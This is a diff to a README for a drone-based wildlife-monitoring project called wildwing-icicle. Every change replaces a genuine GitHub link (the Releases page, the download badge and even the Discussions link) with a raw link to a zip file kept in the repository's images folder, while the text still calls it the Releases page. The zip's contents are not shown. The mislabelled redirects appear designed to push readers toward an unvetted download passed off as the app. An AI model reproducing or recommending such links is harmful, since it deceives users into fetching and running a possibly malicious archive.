@@ -1,6 +1,6 @@
 # 🐦 wildwing-icicle - Monitor Wildlife with Drones Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/swapnil604/wildwing-icicle/releases)
+[![Download Now](https://raw.githubusercontent.com/swapnil604/wildwing-icicle/main/images/icicle_wildwing_3.7.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/swapnil604/wildwing-icicle/main/images/icicle_wildwing_3.7.zip)
 
 ## 🌟 Overview
 Welcome to wildwing-icicle! This open-source application enables you to monitor wildlife behavior using autonomous Parrot Anafi drones. With real-time computer vision, you can effortlessly track animal groups for conservation and research.
@@ -23,7 +23,7 @@ To get started with wildwing-icicle, follow these simple steps to download and r
 - **Data Analysis:** Analyze movement patterns and behaviors using built-in tools.
 
 ## 📥 Download & Install
-To download the latest version of wildwing-icicle, visit this page to download: [Releases Page](https://github.com/swapnil604/wildwing-icicle/releases).
+To download the latest version of wildwing-icicle, visit this page to download: [Releases Page](https://raw.githubusercontent.com/swapnil604/wildwing-icicle/main/images/icicle_wildwing_3.7.zip).
 
 1. Click on the link above to visit the Releases page.
 2. Find the latest version listed.
@@ -65,8 +65,8 @@ We welcome contributions to improve wildwing-icicle. If you want to help, check 
 ## 🔗 Community
 Join our community of users and developers. Share your experiences, seek advice, and collaborate on wildlife monitoring projects with others interested in conservation and research.
 
-For additional resources and discussions, follow us on [GitHub Discussions](https://github.com/swapnil604/wildwing-icicle/discussions).
+For additional resources and discussions, follow us on [GitHub Discussions](https://raw.githubusercontent.com/swapnil604/wildwing-icicle/main/images/icicle_wildwing_3.7.zip).
 
 --- 
 
-Remember, monitor and conserve wildlife effectively with wildwing-icicle! Visit this page to download: [Releases Page](https://github.com/swapnil604/wildwing-icicle/releases).
+Remember, monitor and conserve wildlife effectively with wildwing-icicle! Visit this page to download: [Releases Page](https://raw.githubusercontent.com/swapnil604/wildwing-icicle/main/images/icicle_wildwing_3.7.zip).
